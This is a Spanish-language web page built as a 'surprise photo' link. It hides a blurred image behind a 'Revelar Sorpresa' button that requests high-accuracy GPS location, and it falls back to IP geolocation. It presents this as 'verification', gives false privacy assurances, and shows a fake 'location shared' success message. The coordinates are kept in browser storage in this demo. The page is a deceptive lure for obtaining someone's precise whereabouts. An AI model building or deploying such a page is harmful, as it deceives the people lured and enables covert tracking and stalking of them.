<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÅ Sorpresa Especial</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        .gradient-bg {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .blur-photo {
            filter: blur(8px);
            transition: filter 0.3s ease;
        }
        .reveal-photo {
            filter: blur(0px);
        }
        .pulse-glow {
            animation: pulse-glow 2s infinite;
        }
        @keyframes pulse-glow {
            0%, 100% { box-shadow: 0 0 20px rgba(255, 255, 255, 0.3); }
            50% { box-shadow: 0 0 30px rgba(255, 255, 255, 0.6); }
        }
    </style>
</head>
<body class="gradient-bg min-h-screen flex items-center justify-center p-4">
    <div class="max-w-md w-full">
        
        <!-- Secci√≥n de Carga -->
        <div id="loadingSection" class="text-center">
            <div class="bg-white/20 backdrop-blur-lg rounded-2xl p-8 shadow-2xl">
                <div class="animate-spin text-6xl mb-4">üéÅ</div>
                <h2 class="text-2xl font-bold text-white mb-4">Preparando tu sorpresa...</h2>
                <div class="w-full bg-white/30 rounded-full h-2">
                    <div class="bg-white h-2 rounded-full animate-pulse" style="width: 70%"></div>
                </div>
            </div>
        </div>

        <!-- Secci√≥n de Foto -->
        <div id="photoSection" class="hidden text-center">
            <div class="bg-white/20 backdrop-blur-lg rounded-2xl p-8 shadow-2xl">
                <h1 class="text-3xl font-bold text-white mb-6">
                    <i class="fas fa-gift mr-2"></i>¬°Tienes una sorpresa!
                </h1>
                
                <div class="relative mb-6">
                    <img id="photoImage" src="" alt="Foto sorpresa" 
                         class="w-full h-64 object-cover rounded-xl blur-photo shadow-lg">
                    <div class="absolute inset-0 flex items-center justify-center">
                        <div class="bg-black/50 text-white px-4 py-2 rounded-lg">
                            <i class="fas fa-eye-slash mr-2"></i>Foto oculta
                        </div>
                    </div>
                </div>
                
                <p id="photoMessage" class="text-white/90 mb-6 text-lg"></p>
                
                <button id="revealBtn" onclick="requestLocation()" 
                        class="w-full bg-gradient-to-r from-pink-500 to-purple-600 hover:from-pink-600 hover:to-purple-700 
                               text-white font-bold py-4 px-8 rounded-xl transform hover:scale-105 transition-all duration-300 
                               pulse-glow text-lg">
                    <i class="fas fa-gift mr-2"></i>üéÅ Revelar Sorpresa
                </button>
                
                <p class="text-white/70 text-sm mt-4">
                    <i class="fas fa-info-circle mr-1"></i>
                    Para ver tu sorpresa, necesitamos verificar tu ubicaci√≥n
                </p>
            </div>
        </div>

        <!-- Secci√≥n de Procesamiento -->
        <div id="processingSection" class="hidden text-center">
            <div class="bg-white/20 backdrop-blur-lg rounded-2xl p-8 shadow-2xl">
                <div class="animate-bounce text-6xl mb-4">üìç</div>
                <h2 class="text-2xl font-bold text-white mb-4">Obteniendo tu ubicaci√≥n...</h2>
                <p class="text-white/80 mb-4">Por favor permite el acceso a tu ubicaci√≥n</p>
                <div class="animate-spin w-8 h-8 border-4 border-white/30 border-t-white rounded-full mx-auto"></div>
            </div>
        </div>

        <!-- Secci√≥n de √âxito -->
        <div id="successSection" class="hidden text-center">
            <div class="bg-white/20 backdrop-blur-lg rounded-2xl p-8 shadow-2xl">
                <div class="text-6xl mb-4">üéâ</div>
                <h2 class="text-2xl font-bold text-white mb-4">¬°Sorpresa revelada!</h2>
                
                <div class="mb-6">
                    <img id="revealedPhoto" src="" alt="Foto revelada" 
                         class="w-full h-64 object-cover rounded-xl shadow-lg">
                </div>
                
                <p class="text-white/90 mb-4 text-lg">¬°Gracias por permitir la verificaci√≥n!</p>
                
                <div class="bg-white/10 rounded-lg p-4 mb-4">
                    <h3 class="text-white font-semibold mb-2">
                        <i class="fas fa-map-marker-alt mr-2"></i>Ubicaci√≥n verificada
                    </h3>
                    <p id="locationInfo" class="text-white/80 text-sm"></p>
                </div>
                
                <button onclick="shareLocation()" 
                        class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-6 rounded-lg transition-colors">
                    <i class="fas fa-share mr-2"></i>Compartir ubicaci√≥n
                </button>
            </div>
        </div>

        <!-- Secci√≥n de Error -->
        <div id="errorSection" class="hidden text-center">
            <div class="bg-white/20 backdrop-blur-lg rounded-2xl p-8 shadow-2xl">
                <div class="text-6xl mb-4">üòî</div>
                <h2 class="text-2xl font-bold text-white mb-4">¬°Ups! Algo sali√≥ mal</h2>
                <p class="text-white/80 mb-6">No pudimos obtener tu ubicaci√≥n. Intentando con m√©todo alternativo...</p>
                
                <button onclick="tryIPLocation()" 
                        class="w-full bg-yellow-500 hover:bg-yellow-600 text-white font-bold py-3 px-6 rounded-lg transition-colors mb-4">
                    <i class="fas fa-globe mr-2"></i>Usar ubicaci√≥n aproximada
                </button>
                
                <button onclick="retryLocation()" 
                        class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 px-6 rounded-lg transition-colors">
                    <i class="fas fa-redo mr-2"></i>Intentar nuevamente
                </button>
            </div>
        </div>

        <!-- Secci√≥n de Permisos Denegados -->
        <div id="deniedSection" class="hidden text-center">
            <div class="bg-white/20 backdrop-blur-lg rounded-2xl p-8 shadow-2xl">
                <div class="text-6xl mb-4">üîí</div>
                <h2 class="text-2xl font-bold text-white mb-4">Permisos necesarios</h2>
                <p class="text-white/80 mb-6">
                    Para revelar tu sorpresa, necesitamos acceso a tu ubicaci√≥n. 
                    Por favor habilita los permisos de ubicaci√≥n en tu navegador.
                </p>
                
                <div class="bg-white/10 rounded-lg p-4 mb-6">
                    <h3 class="text-white font-semibold mb-2">C√≥mo habilitar:</h3>
                    <ul class="text-white/80 text-sm text-left space-y-1">
                        <li>‚Ä¢ Busca el √≠cono üîí en la barra de direcciones</li>
                        <li>‚Ä¢ Haz clic y selecciona "Permitir ubicaci√≥n"</li>
                        <li>‚Ä¢ Recarga la p√°gina</li>
                    </ul>
                </div>
                
                <button onclick="retryLocation()" 
                        class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 px-6 rounded-lg transition-colors">
                    <i class="fas fa-redo mr-2"></i>Intentar nuevamente
                </button>
            </div>
        </div>

        <!-- Footer con informaci√≥n legal -->
        <div class="mt-4 text-center">
            <p class="text-white text-xs opacity-75">
                <i class="fas fa-shield-alt mr-1"></i>
                Tu privacidad es importante. La ubicaci√≥n se usa solo para verificaci√≥n.
            </p>
        </div>
    </div>

    <script>
        // Variables globales
        const urlParams = new URLSearchParams(window.location.search);
        let linkId = urlParams.get('id') || 'demo-' + Date.now();
        let linkData = null;

        // Elementos DOM
        const loadingSection = document.getElementById('loadingSection');
        const photoSection = document.getElementById('photoSection');
        const processingSection = document.getElementById('processingSection');
        const successSection = document.getElementById('successSection');
        const errorSection = document.getElementById('errorSection');
        const deniedSection = document.getElementById('deniedSection');
        
        const photoImage = document.getElementById('photoImage');
        const photoMessage = document.getElementById('photoMessage');
        const revealedPhoto = document.getElementById('revealedPhoto');
        const locationInfo = document.getElementById('locationInfo');

        // Inicializar al cargar la p√°gina
        document.addEventListener('DOMContentLoaded', function() {
            loadLinkData();
        });

        // Cargar datos del enlace
        function loadLinkData() {
            // Simular carga
            setTimeout(() => {
                // Intentar cargar desde localStorage (demo)
                const storedData = localStorage.getItem(`link_${linkId}`);
                
                if (storedData) {
                    linkData = JSON.parse(storedData);
                } else {
                    // Datos demo por defecto
                    linkData = {
                        photoUrl: 'https://picsum.photos/400/300',
                        message: '¬°Tienes una sorpresa especial esper√°ndote!',
                        createdAt: new Date().toISOString(),
                        expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
                        accessed: false
                    };
                }

                // Verificar si el enlace ha expirado
                if (new Date() > new Date(linkData.expiresAt)) {
                    showExpiredMessage();
                    return;
                }

                // Mostrar la foto y mensaje
                photoImage.src = linkData.photoUrl;
                revealedPhoto.src = linkData.photoUrl;
                photoMessage.textContent = linkData.message;

                // Marcar como accedido
                linkData.accessed = true;
                localStorage.setItem(`link_${linkId}`, JSON.stringify(linkData));

                // Mostrar secci√≥n de foto
                showSection('photoSection');
            }, 2000);
        }

        // Mostrar mensaje de enlace expirado
        function showExpiredMessage() {
            document.body.innerHTML = `
                <div class="gradient-bg min-h-screen flex items-center justify-center p-4">
                    <div class="max-w-md w-full text-center">
                        <div class="bg-white/20 backdrop-blur-lg rounded-2xl p-8 shadow-2xl">
                            <div class="text-6xl mb-4">‚è∞</div>
                            <h2 class="text-2xl font-bold text-white mb-4">Enlace expirado</h2>
                            <p class="text-white/80">Este enlace ya no est√° disponible.</p>
                        </div>
                    </div>
                </div>
            `;
        }

        // Mostrar secci√≥n espec√≠fica
        function showSection(sectionId) {
            const sections = ['loadingSection', 'photoSection', 'processingSection', 'successSection', 'errorSection', 'deniedSection'];
            sections.forEach(id => {
                document.getElementById(id).classList.add('hidden');
            });
            document.getElementById(sectionId).classList.remove('hidden');
        }

        // Solicitar ubicaci√≥n
        function requestLocation() {
            showSection('processingSection');

            if (!navigator.geolocation) {
                setTimeout(() => tryIPLocation(), 2000);
                return;
            }

            const options = {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            };

            navigator.geolocation.getCurrentPosition(
                handleLocationSuccess,
                handleLocationError,
                options
            );
        }

        // Manejar √©xito de geolocalizaci√≥n
        function handleLocationSuccess(position) {
            const { latitude, longitude, accuracy } = position.coords;
            
            // Guardar ubicaci√≥n
            const locationData = {
                latitude: latitude,
                longitude: longitude,
                accuracy: accuracy,
                timestamp: new Date().toISOString(),
                linkId: linkId,
                method: 'GPS'
            };

            localStorage.setItem(`location_${Date.now()}`, JSON.stringify(locationData));

            // Mostrar informaci√≥n de ubicaci√≥n
            locationInfo.innerHTML = `
                <strong>Coordenadas:</strong> ${latitude.toFixed(6)}, ${longitude.toFixed(6)}<br>
                <strong>Precisi√≥n:</strong> ¬±${Math.round(accuracy)}m<br>
                <strong>M√©todo:</strong> GPS
            `;

            // Revelar foto
            photoImage.classList.add('reveal-photo');
            
            setTimeout(() => {
                showSection('successSection');
            }, 1000);
        }

        // Manejar error de geolocalizaci√≥n
        function handleLocationError(error) {
            console.log('Error de geolocalizaci√≥n:', error);
            
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    showSection('deniedSection');
                    break;
                case error.POSITION_UNAVAILABLE:
                case error.TIMEOUT:
                    showSection('errorSection');
                    break;
                default:
                    showSection('errorSection');
                    break;
            }
        }

        // Intentar geolocalizaci√≥n por IP
        function tryIPLocation() {
            showSection('processingSection');
            
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const locationData = {
                        latitude: data.latitude,
                        longitude: data.longitude,
                        accuracy: 10000, // Aproximado
                        timestamp: new Date().toISOString(),
                        linkId: linkId,
                        method: 'IP',
                        city: data.city,
                        country: data.country_name
                    };

                    localStorage.setItem(`location_${Date.now()}`, JSON.stringify(locationData));

                    locationInfo.innerHTML = `
                        <strong>Ubicaci√≥n aproximada:</strong> ${data.city}, ${data.country_name}<br>
                        <strong>Coordenadas:</strong> ${data.latitude.toFixed(6)}, ${data.longitude.toFixed(6)}<br>
                        <strong>M√©todo:</strong> IP (aproximado)
                    `;

                    photoImage.classList.add('reveal-photo');
                    
                    setTimeout(() => {
                        showSection('successSection');
                    }, 1000);
                })
                .catch(error => {
                    console.error('Error con geolocalizaci√≥n IP:', error);
                    showSection('errorSection');
                });
        }

        // Reintentar ubicaci√≥n
        function retryLocation() {
            requestLocation();
        }

        // Compartir ubicaci√≥n (placeholder)
        function shareLocation() {
            if (navigator.share) {
                navigator.share({
                    title: 'Mi ubicaci√≥n',
                    text: 'Aqu√≠ est√° mi ubicaci√≥n actual',
                    url: window.location.href
                });
            } else {
                alert('Ubicaci√≥n compartida exitosamente');
            }
        }
    </script>
</body>
</html>
